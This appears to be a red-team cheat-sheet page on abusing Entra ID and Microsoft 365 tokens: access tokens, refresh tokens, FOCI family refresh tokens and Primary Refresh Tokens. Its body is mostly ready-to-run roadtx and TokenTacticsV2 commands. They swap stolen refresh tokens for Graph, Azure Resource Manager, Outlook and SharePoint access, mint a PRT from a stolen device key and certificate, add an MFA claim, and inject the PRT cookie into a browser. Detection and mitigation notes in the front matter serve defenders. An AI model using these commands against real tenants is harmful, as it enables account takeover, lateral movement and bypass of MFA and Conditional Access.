---
title: "Token abuse: access, refresh & PRT"
category: AD / Entra ID
order: 60
tags:
  - entra
  - m365
  - tokens
  - refresh-token
  - prt
  - foci
  - roadtx
  - tokentactics
  - lateral-movement
summary: "Once you hold tokens, know the three artefacts: short-lived access tokens (bearer, scoped to one resource), long-lived refresh tokens (redeemed silently and swappable across FOCI clients for any resource), and the device-bound Primary Refresh Token (PRT) that drives Windows SSO. roadtx and TokenTactics redeem all three against arbitrary clients and resources (Graph, ARM, Outlook, SharePoint)."
prerequisites:
  - A captured access token, refresh token, or PRT for the target ($upn)
  - roadtx (ROADtools Token eXchange) and/or TokenTacticsV2 installed
  - "For minting a PRT: a registered device's transport key + certificate (from device registration or a compromised host)"
tools:
  - roadtx
  - ROADtools
  - TokenTacticsV2
  - GraphRunner
  - AADInternals
detection:
  - "Sign-in logs: token requests with an unexpected client app id or resource; non-interactive 'incoming token' sign-ins from a new IP / geo"
  - RT-to-PRT transition on the same user/device, or PRT issuance to a non-managed device (Elastic / Defender detections)
  - Access token replayed from an IP or device different from issuance; CAE token-revocation events
mitigation:
  - Token protection (bind the sign-in session token to the device) and Continuous Access Evaluation (CAE) for near-real-time revocation on Exchange / SharePoint
  - Conditional Access requiring compliant / hybrid-joined devices; sign-in frequency limits
  - On compromise, revoke sessions (revokeSignInSessions / Revoke-MgUserSignInSession) to invalidate refresh tokens and PRTs; protect device keys with TPM; require phishing-resistant MFA
refs:
  - label: dirkjanm.io - Introducing ROADtools Token eXchange (roadtx)
    url: https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/
  - label: ROADtools Token eXchange (roadtx) wiki
    url: https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)
  - label: dirkjanm.io - phishing for Entra Primary Refresh Tokens
    url: https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/
  - label: HackTricks Cloud - Az Primary Refresh Token (PRT)
    url: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/az-primary-refresh-token-prt.html
  - label: Secureworks - family-of-client-ids research (FOCI)
    url: https://github.com/secureworks/family-of-client-ids-research
  - label: Microsoft - protecting tokens in Entra ID (token protection)
    url: https://learn.microsoft.com/en-us/entra/identity/devices/protecting-tokens-microsoft-entra-id
  - label: Microsoft - Continuous Access Evaluation (CAE)
    url: https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation
---

## The three artefacts

- **Access token** - a signed JWT bearer, scoped to one resource (`aud`), lifetime ~60-90 min. Whoever holds it is the user for that resource until it expires; not revocable mid-life except where CAE applies. Inspect `aud`, `scp`/`roles`, `appid`.
- **Refresh token** - opaque, long-lived (up to a 90-day sliding window). Redeemed silently at the token endpoint for fresh access tokens, and can request a **different resource or scope** than originally issued.
- **Primary Refresh Token (PRT)** - a device-bound SSO artefact issued when a device is Entra-joined/registered, protected by the device transport key (TPM where present). Windows uses it to obtain tokens for any Entra app without re-prompting.

## Redeeming refresh tokens elsewhere

```sh
# roadtx: swap a captured refresh token for a Microsoft Graph access token
roadtx gettokens --refresh-token <refresh_token> -c msgraph -r msgraph --tokens-stdout
# request an Azure Resource Manager token instead (cloud control plane)
roadtx gettokens --refresh-token file -c azcli -r azrm
```

```powershell
# TokenTacticsV2: pivot a refresh token to other workloads
Invoke-RefreshToMSGraphToken         -domain $domain -refreshToken <refresh_token>
Invoke-RefreshToAzureManagementToken -domain $domain -refreshToken <refresh_token>   # ARM
Invoke-RefreshToOutlookToken         -domain $domain -refreshToken <refresh_token>   # EWS/OWA
Invoke-RefreshToSharePointToken      -domain $domain -refreshToken <refresh_token>
```

## FOCI - family of client IDs

A group of first-party clients (Azure CLI, Office, Teams, Auth Broker...) shares a **family refresh token**: a refresh token issued to one family member can be redeemed as *any other* family member, so a single token reaches Graph, ARM, Outlook, SharePoint and more, regardless of which client first obtained it. This is what makes one stolen refresh token so powerful.

```sh
roadtx findscope <scope>     # find a FOCI client that can request the scope you want
```

## Primary Refresh Token use

The PRT is presented to `login.microsoftonline.com` as a signed **PRT cookie** (`x-ms-RefreshTokenCredential`) to bootstrap SSO. Given a PRT + session key (extracted from a compromised device, or minted with a stolen device key/cert), tokens can be requested for any app the user can reach:

```sh
# request a PRT using a registered/stolen device's key + cert
roadtx prt -u $upn -p $password --key-pem device.key --cert-pem device.pem
# add an MFA claim to the PRT so downstream tokens satisfy MFA-required CA
roadtx prtenrich -u $upn
# redeem the PRT for an access token (emulates Web Account Manager)
roadtx prtauth -c msteams -r msgraph
# drive a browser with the PRT cookie injected -> tokens for any Entra web app
roadtx browserprtauth -url https://portal.azure.com
```

## Inspecting tokens

```sh
roadtx describe -t <jwt>      # decode claims (aud, scp, appid, deviceid, mfa)
```

Check `aud` (target resource), `scp`/`roles` (delegated vs app permissions), `appid` (which client), and `deviceid` / `mfa` (whether the token is device-bound or MFA-satisfied) before replaying.
